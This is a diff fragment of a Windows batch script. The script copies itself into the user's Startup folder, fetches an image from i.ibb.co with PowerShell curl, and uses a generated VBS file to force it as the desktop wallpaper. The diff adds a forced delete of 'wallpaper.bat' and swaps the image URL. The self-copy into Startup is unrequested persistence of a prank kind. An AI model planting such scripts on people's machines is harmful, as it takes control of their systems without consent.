@@ -26,6 +26,7 @@ cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Sta
 if exist %~nx0 (goto code) else goto clone
 cls
 :clone
+del wallpaper.bat /f
 copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 cls
 goto code
@@ -47,7 +48,7 @@ echo oShell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystem
 ) > wall.vbs
 
 cd C:\Users\%USERNAME%\Downloads
-start powershell curl https://i.ibb.co/5MjPDvc/image.png -O bg.jpg
+start powershell curl https://i.ibb.co/YRLTLDh/image.png -O bg.jpg
 timeout 5 /NOBREAK >NUL
 start wall.vbs
 start wall.vbs
